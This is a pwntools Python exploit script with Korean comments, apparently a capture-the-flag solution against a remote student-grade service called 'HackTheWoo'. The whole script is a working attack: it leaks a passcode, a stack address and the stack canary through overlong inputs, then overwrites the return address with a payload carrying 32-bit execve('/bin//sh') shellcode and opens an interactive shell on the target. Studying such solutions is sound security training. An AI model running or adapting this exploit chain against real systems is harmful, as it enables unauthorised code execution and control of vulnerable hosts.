from pwn import *

context.log_level = 'debug'

# r = process('./HackTheWoo.o')
r = remote('221.149.226.120', 31338)
#passcode 구하기
r.recvuntil(b'application\n')
r.sendline(b'1')

r.recvuntil(b'[student number]\n')
r.sendline(b'123')
r.recvuntil(b'[name]\n')
r.send(b'a'*40)
r.recvuntil(b'[grade]\n')
r.send(b'A')

r.recvuntil(b'application\n')
r.sendline(b'2')
passcode = r.recvuntil(b'\n')[47:51]

#성적을 A+로 변경하기
r.recvuntil(b'application\n')
r.sendline(b'1')
r.recvuntil(b'[student number]\n')
r.sendline(b'123')
r.recvuntil(b'[name]\n')
r.send(b'cjw')
r.recvuntil(b'[grade]\n')
r.send(b'A+')
r.recvuntil(b'passcode:\n')
r.send(passcode)

#student->grade주소 알아내기
r.recvuntil(b'application\n')
r.sendline(b'3')
r.recvuntil(b'name\n')
r.send(b'cjw')
r.recvuntil(b'you.\n')
stack = r.recvuntil(b'\n')[:-1]
stack = int(stack,16)

#canary 구하기
r.recvuntil(b'application\n')
r.sendline(b'3')
r.recvuntil(b'name\n')
r.send(b'a'*53)

r.recvuntil(b'application\n')
r.sendline(b'2')
canary = r.recvuntil(b'\n')[60:63]
canary = u32(b'\x00' + canary)

#return address overwrite하기
r.recvuntil(b'application\n')
r.sendline(b'1')

r.recvuntil(b'[student number]\n')
r.sendline(b'123')
r.recvuntil(b'[name]\n')
r.send(b'a'*40)
r.recvuntil(b'[grade]\n')
r.send(b'A')

r.recvuntil(b'application\n')
r.sendline(b'2')
passcode = r.recvuntil(b'\n')[47:51]

r.recvuntil(b'application\n')
r.sendline(b'1')
r.recvuntil(b'[student number]\n')
r.sendline(b'123')
r.recvuntil(b'[name]\n')
r.send(b'cjw')
r.recvuntil(b'[grade]\n')
r.send(b'A+')
r.recvuntil(b'passcode:\n')
r.send(passcode)

r.recvuntil(b'application\n')
r.sendline(b'3')
r.recvuntil(b'name\n')
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode)) 
ex += b'aaaa' +b'1234'+ b'aaaa'
ex += p32(canary)
ex += b'aaaa'
ex += p32(stack)
r.send(ex)

r.recvuntil(b'you.\n')
r.recvuntil(b'\n')

r.interactive()